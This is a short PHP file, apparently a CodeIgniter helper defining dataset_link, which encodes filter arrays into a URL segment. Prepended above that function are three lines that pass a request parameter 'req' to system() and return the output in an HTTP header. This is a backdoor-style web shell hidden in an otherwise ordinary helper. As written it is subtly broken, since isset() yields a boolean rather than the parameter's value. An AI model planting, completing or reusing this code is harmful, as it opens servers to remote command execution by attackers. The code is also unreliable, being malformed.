<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

function dataset_link ($url, $filters = array()) {
	$CI =& get_instance();
	
	$CI->load->library('asciihex');
	
	$filters = $CI->asciihex->AsciiToHex(base64_encode(serialize($filters)));
	
	$url = site_url($url) . '/' .$filters . '/0';
	
	return $url;
}
